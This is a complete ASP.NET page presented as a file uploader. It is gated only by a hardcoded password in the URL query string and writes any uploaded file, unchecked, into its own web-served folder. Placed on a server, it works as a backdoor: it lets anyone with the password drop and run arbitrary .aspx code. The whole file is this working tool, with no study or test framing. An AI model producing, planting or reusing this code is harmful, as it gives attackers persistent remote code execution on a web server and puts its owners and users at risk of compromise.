<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<%
    // ===== CONFIG =====
    string PASSWORD = "admin987654321!@";  // ← 
    string UPLOAD_DIR = Server.MapPath("."); // Current folder

    // ===== AUTH CHECK =====
    string p = Request.QueryString["p"];
    if (string.IsNullOrEmpty(p) || p != PASSWORD)
    {
        Response.StatusCode = 403;
        Response.Write("Access Denied");
        Response.End();
    }

    // ===== UPLOAD LOGIC =====
    string message = "";
    if (IsPostBack)
    {
        if (Request.Files.Count > 0)
        {
            var file = Request.Files[0];
            if (file != null && file.ContentLength > 0)
            {
                string fileName = Path.GetFileName(file.FileName);
                string savePath = Path.Combine(UPLOAD_DIR, fileName);

                try
                {
                    file.SaveAs(savePath);
                    message = "✅ File uploaded successfully!<br>";
                    message += "File Name: " + Server.HtmlEncode(fileName) + "<br>";
                    message += "Location: Current Directory<br>";
                }
                catch (Exception ex)
                {
                    message = "❌ Upload failed: " + Server.HtmlEncode(ex.Message);
                }
            }
            else
            {
                message = "❌ No file selected or empty file.";
            }
        }
        else
        {
            message = "❌ No files detected in request.";
        }
    }
%>

<!DOCTYPE html>
<html>
<head>
    <title>ASPX File Uploader</title>
</head>
<body>
    <h2>ASPX File Uploader</h2>

    <%
        if (!string.IsNullOrEmpty(message))
        {
            Response.Write("<div style='border:1px solid #ccc; padding:10px; margin-bottom:10px;'>" + message + "</div>");
        }
    %>

    <form method="post" enctype="multipart/form-data">
        <input type="file" name="file" required>
        <button type="submit">Upload</button>
    </form>
</body>
</html>
